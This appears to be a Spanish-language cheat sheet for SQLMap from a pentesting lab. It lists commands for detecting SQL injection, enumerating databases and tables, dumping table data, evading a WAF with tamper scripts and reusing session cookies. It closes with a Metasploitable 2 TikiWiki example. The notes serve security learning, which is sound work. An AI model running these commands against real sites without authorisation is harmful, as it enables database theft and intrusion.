# SQLMap

## Descripción

SQLMap es una herramienta de código abierto que **automatiza la detección y explotación de vulnerabilidades de inyección SQL**. Es capaz de identificar el tipo de inyección, extraer bases de datos, tablas, columnas y datos, e incluso ejecutar comandos en el sistema operativo en casos avanzados.

---

## Instalación

Viene preinstalada en Kali Linux. Para verificar:

```shell
sqlmap --version
```

---

## Uso básico

### Detectar si un parámetro es inyectable

```shell
sqlmap -u "http://TARGET/page.php?id=1" --batch
```

- `-u` : URL objetivo con el parámetro a testear
- `--batch` : Responde automáticamente a todas las preguntas con el valor por defecto (no interactivo)

---

## Opciones más útiles

### Listar bases de datos

```shell
sqlmap -u "http://TARGET/page.php?id=1" --dbs --batch
```

### Listar tablas de una base de datos

```shell
sqlmap -u "http://TARGET/page.php?id=1" -D nombre_db --tables --batch
```

### Volcar contenido de una tabla

```shell
sqlmap -u "http://TARGET/page.php?id=1" -D nombre_db -T nombre_tabla --dump --batch
```

### Especificar el DBMS para acelerar el escaneo

```shell
sqlmap -u "http://TARGET/page.php?id=1" --dbms=mysql --batch
```

### Aumentar nivel y riesgo de los tests

```shell
sqlmap -u "http://TARGET/page.php?id=1" --level=3 --risk=2 --batch
```

- `--level` (1-5): Cuántos parámetros testea. A mayor nivel, más tests pero más lento.
- `--risk` (1-3): Agresividad de los payloads. Risk 3 puede modificar datos.

### Especificar técnica de inyección

```shell
sqlmap -u "http://TARGET/page.php?id=1" --technique=E --batch
```

| Letra | Técnica |
|-------|---------|
| B | Boolean-based blind |
| E | Error-based |
| U | UNION query |
| S | Stacked queries |
| T | Time-based blind |

### Añadir sufijo al payload (útil para ORDER BY)

```shell
sqlmap -u "http://TARGET/page.php?sort=name_asc" --suffix="_asc" --batch
```

### Usar cookies de sesión

```shell
sqlmap -u "http://TARGET/page.php?id=1" --cookie="PHPSESSID=abc123" --batch
```

---

## Consejos importantes

- Si el parámetro está **vacío**, SQLMap no puede comparar respuestas. Siempre proporciona un valor base válido en la URL.
- Las inyecciones en cláusulas **ORDER BY** son más difíciles de detectar. Usa `--technique=E` y un sufijo con `--suffix`.
- Si ves `DBMS error found in HTTP response body` en la salida, es buena señal — significa que MySQL está devolviendo errores visibles.
- Usa `--tamper=space2comment` si hay un WAF que filtra espacios.

---

## Ejemplo real — Máquina Metasploitable 2

En TikiWiki 1.9.5 encontramos una inyección SQL en el parámetro `sort_mode` de `tiki-listpages.php`. El error de MySQL confirmaba la vulnerabilidad:

```
Unknown column '' in 'order clause'
```

Comando usado:

```shell
sqlmap -u "http://192.168.56.101/tikiwiki/tiki-listpages.php?offset=0&sort_mode=pageName_asc" \
  --dbms=mysql \
  --technique=E \
  --dbs --batch --level=3 --risk=2 \
  --suffix="_asc"
```

> En este caso la inyección no fue explotable con SQLMap por validación adicional del lado de la aplicación, pero el error manual en el navegador confirmó su existencia.
